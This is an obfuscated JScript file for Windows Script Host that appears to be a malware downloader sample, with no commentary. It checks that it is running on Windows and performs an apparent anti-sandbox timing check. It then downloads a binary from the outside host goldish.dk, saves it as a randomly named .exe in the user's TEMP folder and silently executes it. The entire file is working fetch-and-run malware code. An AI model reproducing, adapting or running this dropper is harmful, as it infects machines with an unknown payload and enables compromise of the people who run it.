var _Y1 = false;
var _M = "CreateObject";
var _A = function _IC() {return WScript[_M]("WScript"+".Shell");}(), _DB = 11;
var _QB = "MSXML2.XMLHTTP";
var _N0 = 2123213;
var _O = 0;
function _AZ(_RT){_A["Run"](_RT, _O, _O);};
function _Y0(){return _QB + "";};
function _K(_W0, _C){_O = _O * 1; return _W0 - _C;};
function _U(){return _M;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Y1 = true;
  @end
@*/
if (_Y1)
{
var _K0 = "";
function _N(){return 22;};
var _W = 0; var _O0 = 0;
function _ZY()
{
var _KL = new this["Date"]();
var _FC = _KL["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _KL = new this["Date"]();
var _HI = _KL["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _KL = new this["Date"]();
var _RJ = _KL["getUTCMilliseconds"]();
var _W = "_M0";
_W = _K(_HI, _FC);
var _O0 = "_B";
_O0 = _K(_RJ, _HI);
_K0 = "open";
return _K(_W, _O0);
}
var _S = false;
var _P = false;
for (var _Q = _O; _Q < _N() * 1; _Q++){if (_ZY() != _O){
_S = true; 
_O0 = "31" + 11 * _W + _O0; 
_P = true; 
break;
}}
function _TB() {return ((_S == true) && (_S == _P)) ? 1 : _O;};
if (_S && _TB() && _P){
function _L() {return _A["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KS2757OoUqIy.ex" + "e";};
 _DZ = _Y0();
 _F = WScript[_M](_DZ);
 var _I = 1;
 while (_I){
try {
	if (_I == 1)
	{
		_F[_K0]("GET", "http://goldish.dk/o2pds", false);
		_F["send"]();
		_B0 = "Sleep";
	}
	WScript[_B0](_N() + 120); 
	if (_F["readystate"] < 2 * 2) continue;
	_I = _O;
	function _Y(_PO) {var _KX = (1, 2, 3, 4, 5, _PO); return _KX;};
	_A0 = WScript[_U()]("ADODB.Stream");
	_DZ = _A0;
	_DZ[_K0]();
	_DZ["type"] = _Y(1);
	_DZ["write"](_F["ResponseBody"]);
	_A0["position"] = _Y(_O);
	_DZ["Save" + "ToFile"](_L(), 2);
	_A0["cl"+"ose"]();
	_MU = _L();
	_AZ(_MU);
} catch(_K1){};
}
}
}

